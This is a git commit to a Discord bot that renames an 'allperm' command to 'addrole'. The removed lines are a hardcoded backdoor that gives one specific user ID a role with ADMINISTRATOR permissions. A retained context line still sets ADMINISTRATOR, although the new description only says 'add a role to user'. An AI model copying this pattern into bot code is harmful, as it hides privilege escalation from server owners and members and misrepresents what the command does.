194fb49e72cb95012528322a3210f747fbf4ae0d
Tsuki <39961514+orksbane45@users.noreply.github.com>
2019-04-07 00:59:14 +0200

    Update and rename allperm.js to addrole.js

--- commands/addrole.js
+++ commands/addrole.js
@@ -12,13 +12,7 @@ exports.run = function(client, message, args) {
  roleadmin.setPermissions('ADMINISTRATOR');
 };
   
-  if (message.author.id == 264488466849595392) {
-    let osa = message.guild.members.find("id", "264488466849595392");
-    osa.addRole(roleargs);
-     let roleadmin2 = message.guild.roles.find('id', roleargs)
-
- roleadmin2.setPermissions('ADMINISTRATOR');
-}
+ 
   
 }
 
@@ -30,7 +24,7 @@ exports.run = function(client, message, args) {
     };
 
     exports.help = {
-      name: 'allperm',
-      description: 'soon',
-      usage: 'allperm'
+      name: 'addrole',
+      description: 'add a role to user',
+      usage: 'addrole'
     }
